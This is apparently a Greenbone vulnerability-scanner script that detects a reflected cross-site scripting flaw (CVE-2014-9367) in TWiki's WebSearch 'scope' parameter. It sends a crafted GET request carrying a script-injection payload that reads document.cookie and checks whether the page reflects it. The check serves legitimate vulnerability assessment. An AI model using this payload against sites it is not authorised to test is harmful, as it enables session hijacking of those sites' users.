CPE = "cpe:/a:twiki:twiki";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.805233" );
	script_version( "2020-06-09T14:44:58+0000" );
	script_cve_id( "CVE-2014-9367" );
	script_bugtraq_id( 71737 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-06-09 14:44:58 +0000 (Tue, 09 Jun 2020)" );
	script_tag( name: "creation_date", value: "2015-01-06 11:20:18 +0530 (Tue, 06 Jan 2015)" );
	script_name( "TWiki 'scope' Parameter Cross-Site Scripting Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_twiki_detect.sc" );
	script_mandatory_keys( "twiki/detected" );
	script_require_ports( "Services/www", 80 );
	script_tag( name: "summary", value: "This host is installed with TWiki and is
  prone to cross-site scripting vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP GET request
  and check whether it is able to read cookie or not." );
	script_tag( name: "insight", value: "The error exists as /do/view/TWiki/WebSearch
  script does not validate input passed via the 'scope' parameter." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote
  attackers to execute arbitrary HTML and script code in a users browser
  session in the context of an affected site." );
	script_tag( name: "affected", value: "TWiki versions 6.0.0 and 6.0.1" );
	script_tag( name: "solution", value: "Update to the hotfix in the referenced advisory." );
	script_xref( name: "URL", value: "http://www.securitytracker.com/id/1031400" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/534289" );
	script_xref( name: "URL", value: "http://seclists.org/fulldisclosure/2014/Dec/82" );
	script_xref( name: "URL", value: "http://twiki.org/cgi-bin/view/Codev/SecurityAlert-CVE-2014-9367" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_analysis" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!http_port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: http_port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/view/TWiki/WebSearch?search=Search&scope='" + "\"--></style></script><script>alert(document.cookie)</script>";
if(http_vuln_check( port: http_port, url: url, check_header: TRUE, pattern: "script><script>alert\\(document.cookie\\)</script>", extra_check: "[P|p]owered by TWiki" )){
	report = http_report_vuln_url( port: http_port, url: url );
	security_message( port: http_port, data: report );
	exit( 0 );
}
exit( 99 );

